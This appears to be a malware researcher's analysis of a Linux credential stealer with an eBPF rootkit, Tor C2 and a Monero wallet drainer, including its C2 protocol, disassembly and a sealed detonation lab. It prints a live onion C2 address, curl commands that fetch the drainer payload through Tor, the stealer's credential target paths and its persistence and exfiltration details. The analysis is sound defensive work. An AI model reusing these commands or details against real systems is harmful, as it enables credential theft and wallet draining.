The C2 protocol, once you can read it: `GET /api/mt/` for tasking, with a Bearer token derived from `/etc/machine-id`. `GET /bin/sha256/linux` and `GET /bin/linux` to fetch the second stage. `POST /upload` for exfil, as a `multipart/form-data` body with the loot under `name="file"`. One correction to my own early notes: the tasking path is `/api/mt/`, not the `/api/agent` I first wrote. `/api/agent` is byte-level absent from every artifact. `/api/mt/` appears three times in each ELF. A byte-level negative control caught the mis-id.

The whole onion surface is four endpoints:

| endpoint | method | auth | purpose |
|---|---|---|---|
| `/api/mt/` | GET | machine-id Bearer | tasking; JSON reply parsed for the fields `jwt`, `keys`, `secret`, `passphrase`, `kv`, `channels`, `package`, `version`, `url`, `file`, `name`, `value`, `metadata`, `items`, `message`, `role` |
| `/bin/sha256/linux` | GET | none | expected sha256 of the second stage (integrity gate) |
| `/bin/linux` | GET | none | second-stage payload (27,787,328 B, the drainer) |
| `/upload` | POST | none | loot exfil, `multipart/form-data` body with the part under `name="file"` |

That tasking auth I read off the strings, not off the wire. The binary reads `/etc/machine-id` with a `no machine-id` fallback, so the read sits on a live path, and it carries an `Authorization: Bearer` template:

```
$ strings -t x deps | grep -E '/etc/machine-id|no machine-id'
  2dd85 127.0.0.1/etc/machine-id- cmd: 
  2ddeb no machine-idg          # the trailing 'g' is the next literal; the path read is /etc/machine-id
```

The onion is reached only through the in-process Tor SOCKS proxy on `127.0.0.1:9050`, so the tasking request never leaves loopback in the sealed lab and I could not capture the assembled header live. The `Authorization: Bearer` headers I did capture are a different use of the same template, the stolen npm and GitHub tokens validated against `registry.npmjs.org` and `api.github.com`, not this machine-id token. Wave 2 drops the read entirely: `/etc/machine-id` is byte-absent from `js-digest`.

The transport is worth a sentence, because "C2 over Tor" undersells what it carries. The stealer does not shell out to `torsocks` or drop a `torrc`. It ships its own Tor, a `tor-expert-bundle-*.tar.gz` it unpacks at runtime, and then speaks the SOCKS5 handshake itself, in hand-rolled Rust, to that local proxy. The state machine is right there in the strings, one stage per line:

```
$ strings deps | grep -oE 'socks (greeting|CONNECT) (read|write|resp)|socks connect|socks5 auth rejected|socks CONNECT failed: rep=|tor-expert-bundle-' | LC_ALL=C sort -u
socks CONNECT failed: rep=
socks CONNECT resp
socks CONNECT write
socks connect
socks greeting read
socks greeting write
socks5 auth rejected
tor-expert-bundle-
```

So the dependency on the host is nothing. It brings the anonymising transport with it and drives the SOCKS layer byte by byte, which is also why a network monitor on the box sees only loopback traffic to `127.0.0.1:9050` and a Tor circuit, never the onion in clear.

The piece that actually installs the second stage is a stager function. The string literals it drives the swap with sit in `.rodata`, and `strings` pulls them straight out:

```
$ strings -t x deps | grep -E '/usr/bin/monero-wallet-gui|write tmp:|rename: |replace: |download hash mismatch' | LC_ALL=C sort
  2642a rename: 
  26a31 	replace: 
  27982 write tmp: 
  2bdc7 download hash mismatch: got 
  40f85 /usr/bin/monero-wallet-guiserver returned empty binarytmp 200 headers too large
```

Two things to read here. The wallet path is the first 26 bytes of a packed slice at `0x40f85` (the Rust compiler concatenated adjacent literals into `/usr/bin/monero-wallet-gui` + `server returned empty binary` + `tmp 200` + `headers too large`, and the code indexes the 26-byte prefix). Each verb literal carries a one-byte length prefix, which is why `strings` prints `replace:` with a leading tab (`\t` = length 9) and reports the others one byte past their non-printable prefix. The verbs `write tmp: -> rename: -> replace:` (plus the `download hash mismatch` guard) are the stage log of an atomic file swap. Disassembling the stager function at `0x1020ae` with `objdump` and reading its string-reference sites in address order lays out the whole sequence (the `# <offset>` comments are `objdump`'s, the `<-` notes are mine, and the offsets are the same `.rodata` literals from the table above):

```
$ objdump -d -M intel --start-address=0x1020ae --stop-address=0x102a40 deps \
    | grep -E '# (29071|27974|2bdc6|40f85|27981|26429|26a31) <|push   0x3c$|mov    edi,0x12c$' \
    | sed -E 's/^ +//; s/\t+/  /g; s/ +<malloc@plt[^>]*>//; s/ +#/   #/'
1020fc:  48 8d 35 6e 6f f2 ff   lea    rsi,[rip+0xfffffffffff26f6e]   # 29071   <- "/bin/sha256/"  GET the expected hash
102275:  6a 3c                  push   0x3c                                    <- sleep 60s after a good replace
102319:  4c 8d 25 65 ec f3 ff   lea    r12,[rip+0xfffffffffff3ec65]   # 40f85   <- the wallet path, held in r12
10254f:  48 8d 35 1e 54 f2 ff   lea    rsi,[rip+0xfffffffffff2541e]   # 27974   <- "\ndownload:"  GET the payload
10266a:  48 8d 3d 14 e9 f3 ff   lea    rdi,[rip+0xfffffffffff3e914]   # 40f85   <- wallet path
1026d1:  48 8d 35 ee 96 f2 ff   lea    rsi,[rip+0xfffffffffff296ee]   # 2bdc6   <- "download hash mismatch: got"  integrity gate
102749:  48 8d 35 35 e8 f3 ff   lea    rsi,[rip+0xfffffffffff3e835]   # 40f85   <- wallet path
1027f9:  48 8d 35 81 51 f2 ff   lea    rsi,[rip+0xfffffffffff25181]   # 27981   <- "write tmp:"  ┐
102859:  48 8d 15 25 e7 f3 ff   lea    rdx,[rip+0xfffffffffff3e725]   # 40f85   <- wallet path  │ atomic swap
1028ac:  48 8d 35 76 3b f2 ff   lea    rsi,[rip+0xfffffffffff23b76]   # 26429   <- "rename:"     │ over the wallet
102918:  48 8d 35 12 41 f2 ff   lea    rsi,[rip+0xfffffffffff24112]   # 26a31   <- "replace:"    ┘
102a2b:  bf 2c 01 00 00         mov    edi,0x12c                               <- sleep 300s on failure, then retry
```

So the stealer fetches a binary over Tor, hash-checks it against a hash the same C2 serves, writes it to a temp file, then atomically renames it over `/usr/bin/monero-wallet-gui`. The next time the victim launches their Monero wallet, they launch the attacker's build. This is also worth stating plainly: there is no rich RAT verb set here. I went looking for a command enum (download / kill / persist) and there is none. `noop` is the netlink `NLMSG_NOOP` from the rootkit, `persist` is bundled SQLite text, `kill` is an error string. The malware is collection-centric with one fixed secondary payload, not a remotely-driven backdoor.

### probing the live C2 {#c2-probing}

The onion was live the whole time I was working, so I probed it directly over Tor: passive GET only, no auth material, no exploitation. Tor does the reaching, I just point a SOCKS client at it. Start the daemon, which opens a SOCKS proxy on `127.0.0.1:9050`, confirm it is actually listening, then `curl` through it (`--socks5-hostname` so the `.onion` is resolved by Tor, not locally):

```
$ sudo systemctl start tor
$ ss -ltupn | grep 9050
tcp   LISTEN 0  4096   127.0.0.1:9050   0.0.0.0:*   users:(("tor",...))
$ ONION=olrh4mibs62l6kkuvvjyc5lrercqg5tz543r4lsw3o6mh5qb7g7sneid.onion
$ curl --socks5-hostname 127.0.0.1:9050 -s -o /dev/null -w '%{http_code}\n' "http://$ONION/api/mt/"
200
```

The port map first, each port a `curl --socks5-hostname` against `http://$ONION:<port>/`:

```
port 80    OPEN   HTTP, answers requests
port 8080  OPEN   accepts TCP, sends no HTTP response (raw/custom or dead)
all others REFUSED
```

Then the path behaviour. The root `/` times out (the server rejects an unauthenticated root request), and every other path returns `HTTP/1.1 200` with an empty body, `Content-Length: 0`. It is a catch-all. I threw a 4,750-word directory brute and a focused info-disclosure list at it and the answer never changed:

```
$ for p in / /api/mt/ /api/ /upload /bin/ /bin/sha256/linux \
           /api/config /api/task /api/tasks /api/cmd /api/ping \
           /api/register /api/version /api/heartbeat /api/checkin /api/agent \
           /status /health /metrics /admin /dashboard \
           /monero /miner /wallet /.git/ /.env /server-status ; do
      printf '%-22s ' "$p"; curl --socks5-hostname 127.0.0.1:9050 -s -o /dev/null -w '%{http_code} %{size_download}\n' "http://$ONION$p"
  done
/                      000 0          (root: timeout, connection reset)
/api/mt/               200 0
/api/                  200 0
/upload                200 0
/bin/sha256/linux      200 0
/api/agent             200 0          <- note: 200-empty, same as every bogus path
/monero                200 0
/miner                 200 0
/wallet                200 0
/.git/                 200 0
/.env                  200 0
/server-status         200 0
```

Every path is `200 0`. There is no Server header, no `/server-status`, no `.git`, no `.env`, no source leak, no stack trace. A real endpoint and a garbage endpoint are indistinguishable to an unauthenticated client, which is the point: the server only serves real content to a victim beacon presenting a valid `/etc/machine-id`-derived Bearer. `/api/agent` returning `200 0` is exactly why I could not tell from probing alone that it was the wrong path. Only the byte-level binary search settled that `/api/mt/` is real and `/api/agent` is not.

The two paths that do return content are the payload endpoints, and the content is auth-free because that is how the dropper fetches the second stage. A complete fetch of `/bin/linux`, with the length verified against the `Content-Length` so I would not get fooled by a truncated transfer again:

```
$ curl --socks5-hostname 127.0.0.1:9050 -s -D - -o bin_linux.fetch "http://$ONION/bin/linux"
HTTP/1.1 200 OK
Content-Length: 27787328
$ stat -c%s bin_linux.fetch ; sha256sum bin_linux.fetch
27787328
47893d9badc38c54b71321263ce8178c1abb10396e0aadf9793e61ec8829e204    <- complete, == v1
```

A matching ELF hash proves the server is up. It does not prove the server is still handing out the trojan rather than a cleaned build. Those are different claims, and I wanted the second one, so I ran the same read-only zlib carve over the bytes I had just pulled that I run over the held samples. No execution, just decompress and grep for the drainer markers:

```
$ python3 - <<'PY'   # read-only: zlib-scan the freshly fetched bytes, never executes them
import zlib
buf = open("bin_linux.fetch", "rb").read()
hit = None
for i in range(len(buf) - 1):
    if buf[i] == 0x78 and buf[i+1] in (0x01, 0x9c, 0xda):   # zlib stream magic
        try:
            d = zlib.decompressobj().decompress(buf[i:i+0x40000])
            if b'onHeightRefreshed' in d and b'865BH8' in d:
                hit = (i, d); break
        except Exception:
            pass
i, d = hit
print("main.qml zlib stream offset :", hex(i))
print("865BH8 drain address present:", b'865BH8' in d)
print("createTransactionAllAsync   :", d.count(b'createTransactionAllAsync'), "call sites")
print("commitTransactionAsync      :", b'commitTransactionAsync' in d, "(silent auto-broadcast)")
PY
main.qml zlib stream offset : 0xc4194a
865BH8 drain address present: True
createTransactionAllAsync   : 2 call sites
commitTransactionAsync      : True (silent auto-broadcast)
```

The bytes the onion handed me this session decompress to the same `main.qml`, the same `865BH8` sweep address, the same two `createTransactionAllAsync` sites (the injected sweep plus the stock user-send), and the same silent `commitTransactionAsync` auto-broadcast. The channel is live and it is still serving the drainer, not a patched-clean wallet. Anyone who installed during the poisoning window pulled this exact payload, and the C2 was still handing it out while I was writing this. I saved the fetched copy as `live_47893d9badc38c54_27787328.bin`. It is byte-identical to the v1 on my disk.

`/api/mt/` is the tasking channel. Decompiling the routine that issues it (`deps_tasking_mt.c`, `fcn.00156031`) shows it expects a JSON object back and parses these `.rodata` field names out of it: `jwt`, `keys`, `secret`, `passphrase`, `kv`, `channels`, `package`, `version`, `url`, `file`, `name`, `value`, `metadata`, `items`, `message`, `role`. I get an empty body because I am not a registered victim. `POST /upload` is the exfil sink, and the request is hand-built from `.rodata` templates like everything else: a `multipart/form-data` body with one part, `Content-Disposition: form-data; name="file"; filename="…"` carrying `Content-Type: application/octet-stream`. On the wave-1 stealer the hardcoded host is `temp.sh` (a one-time file-share), with the upload metadata relayed back through the onion. The wave-2 build strips `temp.sh` and uploads to a runtime-supplied host instead. Both request templates sit in `.rodata` in the clear:

```
$ strings -t x deps | grep -E 'POST /upload HTTP|multipart/form-data; boundary|application/octet-stream|Content-Disposition: form-data|GET /api/mt/'
  25cd8 Content-Disposition: form-data; name="file"; filename="
  25d14 Content-Type: application/octet-stream
  2844f POST /upload HTTP/1.1
  28470 Content-Type: multipart/form-data; boundary=
  28bc2 GET /api/mt/
  2a839 GET /api/mt/
  2aeee GET /api/mt/
```

The three `GET /api/mt/` copies are the tasking template reused at three call sites. The `POST /upload` multipart body is the one-part `name="file"` exfil envelope, octet-stream, no encryption layer of its own.

That exfil change is one piece of a broader retarget. The two stealers carry the same rootkit object byte-for-byte, but `js-digest` (wave 2) is not just a rebuild of `deps` (wave 1), it is trimmed and re-aimed at the harvest layer. Measured against wave 1, wave 2 drops the Discord token grabber (thirteen clients in wave 1, zero in wave 2), drops the explicit `monero-wallet-gui` and `/opt/exodus` wallet targeting, drops the `machine-id` read, and adds the GPG keyring enumeration shown earlier:

```
$ for s in 'DiscordCanary' 'monero-wallet-gui' 'machine-id' 'list-keys --with-colons'; do
    printf '%-26s deps=%s  js-digest=%s\n' "$s" \
      "$(strings deps|grep -ic "$s")" "$(strings jsdigest_deps.bin|grep -ic "$s")"
  done
DiscordCanary              deps=1  js-digest=0
monero-wallet-gui          deps=1  js-digest=0
machine-id                 deps=2  js-digest=0
list-keys --with-colons    deps=0  js-digest=1
```

Same kernel implant, same loader trick, different shopping list per wave. The collector is being iterated on its own, which is what you would expect from a campaign running more than one push.

The info-disclosure hunt came up empty. No deanonymization handle on the onion side. I am saying so rather than dressing up a dead end. The deanonymization anchor turned out to live on the other operation, the Cloudflare tunnel, below.

## trying to run it {#detonation}

I wanted dynamic confirmation, not just a static read. Getting the second stage to actually execute turned into a series of walls, and I think the walls are worth listing because they are the real cost of detonating a from-source native build.

- The guest distro had to match for shared-library sonames to line up.
- It links GTK3 for the `qgtk3` Qt theme, so the guest needed the matching GUI libs or it would not start.
- The binary is built `-march=native` on an AVX-512 box. It has 10,910 `%zmm` instructions. My analysis CPU is AVX2 only, so the process took an illegal-instruction SIGILL the moment it hit AVX-512. QEMU's TCG cannot emulate AVX-512 either. The only way I got it to run was under Intel SDE (`sde64 -spr`, Sapphire Rapids profile), which emulates the instruction set in userspace.
- Even then it is a GUI wallet. It comes up in a setup wizard and waits for a human, which I later scripted around with a pre-seeded config that auto-opens a funded wallet (see below).

What detonation did prove, in the sealed guest: the stage-one stealer behavior is real (49 files touched, the four token-validation calls captured over TLS interception, the supply-chain pivot confirmed). What it could not reach: the live Tor beacon (the onion is unreachable from a sealed lab by design) and the drain itself. The drain wall is worth being precise about, because I climbed past "the wizard stops you" and hit something more interesting underneath.

I scripted past the wizard. A pre-seeded `monero-core.conf` auto-opens a wallet file, and I funded a private chain to put coins behind it: `monerod --regtest --fixed-difficulty 1 --offline`, a wallet restored at height 0, and `generateblocks` to mine 80 blocks straight to its address. That is the exact recipe Monero's own `functional_tests` use (mainnet-default wallet, restore height 0, regtest daemon), so the rig is canonical, not improvised. Funding worked: 80 blocks, coinbase to the wallet's `4...` address, confirmed by the daemon's `generateblocks` reply. The trojan opened that wallet, connected to the local node, and the GUI reported "Daemon synchronized (81)" and "Wallet synchronized."

And the balance stayed `0.000000000000`. The wallet never credited a coin, so the `> 1 XMR` gate the drainer checks was never met and the sweep branch never ran. The cause is a known Monero bug, not my lab. A `--regtest` chain activates hard fork v16 at height 1, and the v0.18.5.0 `libwallet` the trojan is built on rejects that during refresh. It is filed as [monero-project/monero#8600](https://github.com/monero-project/monero/issues/8600), a regression since v0.18.1.1. I reproduced it head-on with the stock `monero-wallet-cli` against the same daemon, no QML and no trojan in the picture:

```
$ printf 'refresh 0\nbalance\nexit\n' | monero-wallet-cli --wallet-file w --password '' \
    --daemon-address 127.0.0.1:18081 --trusted-daemon
Starting refresh...
Error: refresh failed: refresh error: Unexpected hard fork version v16 at height 1.
       Make sure the node you are connected to is running the latest version. Blocks received: 0
[wallet 482RFD (out of sync)]:
```

Same library, same wall. The GUI hits it too and swallows it, which is why it paints "synchronized" off the daemon height while crediting nothing. The consequence is that no offline chain can fund a syncable wallet for this build: regtest is rejected at genesis, and a fresh main or test chain starts at hard fork v1 and would need millions of blocks to reach the RingCT fork the wallet expects. The only way left to film the sweep is a live testnet or stagenet wallet funded from a faucet, where the chain carries a real fork history. There the drainer would fire, but the sweep targets a mainnet address (`865BH8...`), so it errors at the address-network check and still moves no coins. The capturable artifact is the unsolicited `createTransactionAllAsync` call, which is the same fact the QML already proves on disk. I chose not to take the sample online for a result the static read already nails. So the drainer proof below is a static one, and I want to be clear about that boundary. I proved the drainer by reading its code and running a negative control against the stock wallet, not by watching coins move. The logic does not need the demo to be true, but I did not get the demo.

Here is the stage-one stealer trace from the sealed guest. To be exact about provenance: this is composited from several detonation runs, not one capture that did everything. The honey-harvest file list came from one run, the Vault enumeration from another, the connect counts from the ftrace of a third. No single run exercised every path, because the sealed lab starves the beacon of the network it wants. The startup sequence is identity-collection first, then it arms the rootkit. Read off the syscall trace, machine-id is the fifth thing it touches, right after it figures out who it is running as:

```
agent startup (from agent_trace.txt / ftrace)
  getrandom() x2            ← crypto init
  open /etc/passwd          ← enumerate real users (this is why $HOME is not enough isolation)
  /proc/self/loginuid       /proc/self/status
  open /etc/machine-id      ← C2 Bearer is derived from this
  /sys/fs/bpf/e3722d97/     ← pins hidden_pids / hidden_names / hidden_inodes (dir name randomized)
  /proc/version_signature   statfs() x3
  bpf() load tracepoint programs   ← rootkit arms here
```

Each of those startup lines has a static counterpart you can point at in the ELF:

| dynamic (syscall trace) | static (file offset in the binary) |
|---|---|
| `open("/etc/machine-id")` | the read at `.rodata 0x2dd85` with the `no machine-id` fallback right after; this is the C2 Bearer source |
| `bpf(BPF_PROG_LOAD)` + pins under `/sys/fs/bpf/<rand>/{hidden_pids,...}` | the embedded eBPF object carved at file offset `0x324f9` (`sha256 3607de25…`, the rootkit) |
| `connect(127.0.0.1:8200)` x9 (next block) | the `X-Vault-Token:` header at `0x29cd5` and `/.vault-token` at `0x2c537` it reads first |

Then it tries to reach out, and in the sealed guest the beacon cannot route, which it announces every five seconds:

```
$ grep -E 'connect|ENETUNREACH' ftrace.txt | head
  sys_connect(127.0.0.1:8200) x9         ← the Vault enumeration above
  sys_connect(8.8.8.8:443)    x28        ← DoH probes (Google)
  sys_connect(1.1.1.1:443)    x28        ← DoH probes (Cloudflare)
  sys_connect(127.0.0.1:443)  x12        ← loopback TLS (Tor/SOCKS probe)
  sys_connect(<tor>) -> ENETUNREACH (0xffffffffffffff9b), retry every 5s
  ← worker hidden from ps as: kworker/R-kmpat-2358   (kernel-thread name spoof)
```

DNS in the installer phase: `registry.npmjs.org` and `api.github.com` from the stealer. Two more names in that capture, `api.snapcraft.io` and `ntp.ubuntu.com`, are not the malware, they are the guest's own background daemons, and it is worth not misattributing them. The binary has no Snap Store API surface at all (no `api.snapcraft.io`, `snapd`, `macaroon`, `snap-store`, or `login.ubuntu.com` strings). The only `snap/` paths it carries are app-config directories it reads credentials out of (`snap/slack/current/.config/Slack`, `snap/telegram-desktop/current/.../tdata`). So the `api.snapcraft.io` hit is Ubuntu's `snapd` doing its routine store poll, and the `sslv3_alert_bad_certificate` it threw is `snapd` verifying the sink's MITM leaf and rejecting it. That rejection is the useful tell, not a malware capability: `snapd` is a properly verifying TLS client, so the sink could not fool it, which is the exact opposite of the stealer's own no-op-verifier rustls path two sections up that decrypted without complaint. Persistence drops a copy of itself and wires it to systemd:

```
drop:        /var/lib/moge/moge   mode 0700        (8-char name randomized per host; also seen hite, ledodo, trakevu)
root unit:   /etc/systemd/system/moge.service       Restart=always RestartSec=30 WantedBy=multi-user.target
user unit:   ~/.config/systemd/user/moge.service    Restart=always RestartSec=30
bpf pins:    /sys/fs/bpf/e3722d97/{hidden_pids,hidden_names,hidden_inodes}   (8-hex dir, also randomized)
hw fingerprint: /sys/class/dmi/id/board_serial, /sys/firmware/dmi/tables/*   (anti-VM / machine binding)
```

And here is what it actually read off the canary home in that run, the credential files behind the "49 files" count, pulled straight from the `openat` trace (`agent_trace.txt`):

```
$ grep openat agent_trace.txt | grep -oE '/home/dev/\S+|/etc/\S+' | sort -u
/etc/passwd                       /etc/machine-id              /etc/rancher/k3s/k3s.yaml
/home/dev/.aws/credentials        /home/dev/.kube/config       /home/dev/.vault-token
/home/dev/.config/gh/hosts.yml    /home/dev/.npmrc             /home/dev/.pypirc
/home/dev/.ssh/id_ed25519         /home/dev/.ssh/id_rsa
/home/dev/seed.txt                /home/dev/wallet.txt
/home/dev/.config/Slack/Cookies   /home/dev/.config/Slack/Default/Cookies   /home/dev/.config/Slack/Network/Cookies
/home/dev/.config/gcloud/credentials.db
/home/dev/.config/discord/Local Storage/leveldb/      ...                    (49 paths in total)
```

That is the whole target list in one sweep: cloud (`aws`, `gcloud`, `kube`, `k3s`), publishing (`gh/hosts.yml`, `npmrc`, `pypirc`), keys (`ssh`), wallets (`seed.txt`, `wallet.txt`, `vault-token`), and chat (`Slack`, `discord`) cookie stores. The `dev` user's home was the canary I planted. The malware walked it from `/etc/passwd`, exactly the gap that makes a `$HOME` override useless as isolation.

A crash is not a benign result, by the way. The first few times it SIGILL'd I had to resist writing "no malicious behavior observed." No behavior was observed because the process died on instruction four, not because it was clean. Gate your conclusions on the thing actually having run.

## the detonation lab {#lab}

The traces above came out of a lab built around one rule: the malware never touches a real network, a real credential, or a path back to the host. Static analysis tells you what the code can do. This is how I watched what it actually does without giving it anything real to do it to. The isolation choices are the whole difference between a result and an incident, so here is the rig.

The shape of it. A throwaway QEMU/KVM guest (Ubuntu 24.04 cloud image) runs on an ephemeral qcow2 overlay over a read-only base, so every run starts from the same clean state and nothing survives poweroff. No host filesystem is mounted into the guest, which is the lesson from the namespace harness that failed earlier in this investigation. QEMU's `-netdev user,restrict=on` is a hard no-egress backstop: even if something inside tries to reach the internet, the packets die at the virtual NIC. Inside the guest, every outbound TCP is redirected to a local sink and DNS is answered by a fake resolver pointing everything at `127.0.0.1`. The sample runs believing it is online. Nothing leaves.

The build, from the real harness. The base is the official Ubuntu 24.04 (noble) server cloud image, downloaded once, and every run gets a fresh copy-on-write overlay so the base stays read-only and pristine:

```bash
# one-time: the official Ubuntu 24.04 cloud image (separate guest kernel, not the host's)
curl -fL -o ubuntu2404-base.qcow2 \
  https://cloud-images.ubuntu.com/noble/current/noble-server-cloudimg-amd64.img

# per run: an ephemeral overlay over the read-only base, thrown away afterwards
qemu-img create -f qcow2 -F qcow2 -b ubuntu2404-base.qcow2 overlay.qcow2 16G
```

The sample and the whole harness (the sink, the tracer, `run.sh`) ride in on one labeled ext4 disk, and the capture comes back on a second one, so the host filesystem is never mounted into the guest:

```bash
mke2fs -q -t ext4 -L PAYLOAD -d ./payload/ payload.img 160M   # sample + sink + tracer + run.sh
mke2fs -q -t ext4 -L RESULTS              results.img  96M     # capture lands here, pulled back with debugfs
```

There is no SSH and no operator in the loop. The guest drives itself through a cloud-init seed ISO: `user-data` mounts the two labeled disks, runs `run.sh`, and powers the guest off when it finishes, so a detonation is unattended and self-terminating.

```yaml
# user-data (cloud-init): mount, detonate, capture, poweroff
power_state: {mode: poweroff, timeout: 2400, condition: true}
runcmd:
  - [bash, -c, "mount -L PAYLOAD /mnt/p && mount -L RESULTS /mnt/r &&
               bash /mnt/p/run.sh > /mnt/r/orchestrator.log 2>&1; umount /mnt/r; sync"]
```

```bash
xorriso -as mkisofs -V cidata -J -r -o seed.iso user-data meta-data    # the cloud-init disk
```

Then it boots, four drives (the overlay, the cloud-init seed, the two labeled disks), with `restrict=on` as the hard no-egress backstop and a full packet dump for the record:

```bash
# restrict=on: packets cannot leave the NIC. capture comes back on a labeled disk, read offline.
qemu-system-x86_64 -enable-kvm -m 3072 -smp 2 -display none -no-reboot \
  -drive file=overlay.qcow2,if=virtio \                          # ephemeral overlay over the RO base
  -drive file=seed.iso,if=virtio,format=raw,media=cdrom \        # cloud-init: auto-runs the harness
  -drive file=payload.img,if=virtio,format=raw \                 # sample + harness, mounted in-guest
  -drive file=results.img,if=virtio,format=raw \                 # capture written here, dumped via debugfs
  -netdev user,id=n0,restrict=on -device virtio-net-pci,netdev=n0 \   # hard no-egress
  -object filter-dump,id=d0,netdev=n0,file=nic.pcap \            # every packet, on the record
  -serial file:vm_console.log
```

The bait. The guest home for `root`, `dev`, and `ubuntu` is seeded with canary credentials the malware cannot distinguish from real ones, each carrying a `HONEYCANARY` marker so I can grep afterward for exactly what it read: SSH keys, `.aws/credentials`, `.npmrc`, `gh/hosts.yml`, `.kube/config`, `.vault-token`, the browser cookie stores, Slack/Discord/Teams LevelDB, a Telegram `tdata`, and decoy wallets. The GitHub and npm tokens here are the ones that surface in the token-validation capture from the pivot section.

```bash
printf 'github.com:\n  oauth_token: gho_HONEYCANARY...\n  user: victim\n' > ~/.config/gh/hosts.yml
echo  '//registry.npmjs.org/:_authToken=npm_HONEYCANARY...'                 > ~/.npmrc
```

The wiretap. The stealer talks HTTPS to GitHub and npm, so to read those requests I terminate TLS at the sink, which mints a leaf certificate per SNI on the fly. The token-validation requests come out in cleartext not because the stealer trusts a CA I planted, but because it does not authenticate the server at all: its `rustls` client ships a no-op verifier (`NoCertVerifier` in the binary, and none of the `rustls-native-certs` / `webpki` / `ca-certificates.crt` strings a verifying client would carry), so it accepts the sinkhole's self-signed leaf without checking. See the stage-one section for the full argument and the no-CA control that would confirm it. The same listener also answers SOCKS5, the bundled Tor's hop, and logs the CONNECT target it asks for.

```python
# sink: per-SNI leaf cert, decrypt, log the request line, answer with a canary body
def handle(conn, port):
    first = conn.recv(1, MSG_PEEK)
    if first == b"\x05":                        # SOCKS5 -> log the onion it wants
        host, dport = parse_socks_connect(conn)
        log(port, "SOCKS5 CONNECT", host, dport, "<<<< C2 TARGET")
    elif first == b"\x16":                       # TLS ClientHello -> MITM it
        sni = sni_of(conn.recv(2048, MSG_PEEK))
        tls = ctx_for(sni).wrap_socket(conn, server_side=True)    # leaf minted for this SNI
        req = tls.recv(16384)
        log(port, "sni", sni, req.split(b"\r\n")[0])              # GET /user/repos, Authorization: ...
        tls.sendall(canary_response(req))                         # {"login":"victim", ...}
```

The observers. A `ptrace` tracer follows the resident agent and records `openat`/`connect`/`socket`/`execve` in order, which is where the startup sequence and the file-access list above come from. `ftrace` on `sys_enter_connect` is the backup that produced the connect counts. A `/proc/<pid>/mem` scanner sweeps the live agent for the decoded onion. The run ends on assertions against real artifacts, never on a feeling, and the output prints the evidence rather than narrating itself:

```bash
A=$(find /var/lib -maxdepth 3 -type f -newermt "@$START" -executable)
[ -n "$A" ] && echo "PASS drop    $A  ($(stat -c%s "$A")b  $(sha256sum "$A"|cut -c1-16))" \
            || echo "FAIL drop    no new /var/lib payload"
P=$(find /sys/fs/bpf -mindepth 1)
[ -n "$P" ] && echo "PASS rootkit bpf pinned -> $P" || echo "FAIL rootkit no bpf pins"
H=$(find /root /home/dev -type f -newerat "@$START" | wc -l)
[ "$H" -gt 0 ] && echo "PASS harvest $H canary files read after detonation" || echo "FAIL harvest none"
ON=$(grep -aoE '[a-z2-7]{16,56}\.onion' c2_capture.log mem_hits.txt | sort -u | head -1)
DEST=$(grep -aiE 'TLS sni [a-z0-9.]+|CONNECT ->' c2_capture.log | head -1)
if   [ -n "$ON" ];   then echo "PASS BEACON onion -> $ON"
elif [ -n "$DEST" ]; then echo "PASS BEACON C2 destination captured -> $DEST"   # the token-validation pivot
else                      echo "FAIL BEACON agent bailed pre-network"
fi
```

Here is the actual `TEST_REPORT.txt` from one run (`vmtest_1781526796`, beacon line trimmed: per-entry ISO timestamps and the repeated `orig_dst 127.0.0.1:443` stripped, otherwise verbatim):

```
PASS  DROP self-install -> /var/lib/moge/moge (3040376b, sha256 6144d433f8a03168)
PASS  ROOTKIT eBPF pinned -> /sys/fs/bpf/e3722d97 /sys/fs/bpf/e3722d97/hidden_inodes /sys/fs/bpf/e3722d97/hidden_names /sys/fs/bpf/e3722d97/hidden_pids
INFO  ExecStart=/var/lib/moge/moge
NOTE  drop dir 'moge' visible to ls (hiding not active)
PASS  PERSIST systemd -> /etc/systemd/system/moge.service
PASS  BEACON C2 destination captured -> PORT 443 TLS sni registry.npmjs.org; PORT 443 TLS sni api.github.com; ...
PASS  HARVEST 49 files read after detonation; e.g.: .git-credentials  .local/share/TelegramDesktop/tdata/key_datas
      .aws/credentials  .kube/config  .vault-token  .ssh/id_ed25519  .config/gh/hosts.yml  .config/gcloud/credentials.db ...
```

Read what the beacon actually passed on. It is not the onion. The Tor C2 is unreachable from a sealed lab by design, so the onion never appears in the capture. The beacon line passed because the TLS-MITM caught the next-best thing, the stealer validating its stolen GitHub and npm tokens against `api.github.com` and `registry.npmjs.org`, which is the supply-chain pivot happening live. So this run proves the drop, the rootkit pin, the persistence unit, the token-validation pivot, and the 49-file harvest. What it does not reach is the onion tasking channel and the drain. The `NOTE drop dir 'moge' visible to ls` line is also honest: the rootkit pinned its maps but its `getdents` hiding did not take effect on this kernel (the `bpf_probe_write_user` path the stock kernel's lockdown LSM restricts), which is the same split covered later.

One thing earlier runs left as "maps pinned, hiding not active": whether the rootkit's programs actually censor anything once they run, or just load. The behavioral harness ran the resident agent under a tracer, enough to confirm the map pins but not enough to see the programs bite. So I ran a second experiment in the sealed VM: launch the dropped resident agent as plain root, unwrapped, then ask the kernel what attached and try to trip each behavior.

```
$ bpftool prog show | grep tracepoint        # all 13 of the rootkit's programs attach, uid 0
64: tracepoint name enter_getdents    65: tracepoint name exit_getdents
66: tracepoint name on_exec           67: tracepoint name enter_ptrace
73: tracepoint name enter_socket      75: tracepoint name enter_recvmsg   (+ the net_* set)

$ strace -p 1151                              # 1151 = the resident agent (dropped as 'sloro')
$ echo $?
137                                           # 137 = SIGKILL: the ptrace hook killed the tracer
```

So the anti-debug is not theoretical. All thirteen tracepoint programs attach, and the instant `strace` seizes the agent the rootkit's `sys_enter_ptrace` program fires `bpf_send_signal(9)` and the tracer dies with code 137. That kill is gated on the target being in `hidden_pids`, so its firing also proves the agent had already added its own pid to the hide list: the maps are populated and live, not just pinned.

The file and socket hiding is the honest other half. In the same run the drop dir stayed visible to `ls /var/lib` and the agent's pid stayed visible in `/proc`. The split is mechanical. The kill uses `bpf_send_signal`, which a modern kernel allows. The hiding rewrites the buffer the kernel already returned to userspace with `bpf_probe_write_user`, which a stock kernel with the lockdown LSM loaded restricts. I did not capture a kernel taint line pinning the cause to `bpf_probe_write_user` specifically, so I state only what I observed: the anti-debug SIGKILL is live and demonstrated, the getdents and `/proc` hiding did not take effect on this kernel, and both are driven off the same populated hide-list. On a kernel that permits the userspace write the same programs would hide. Here the most dangerous one, the debugger kill, is the one that works.

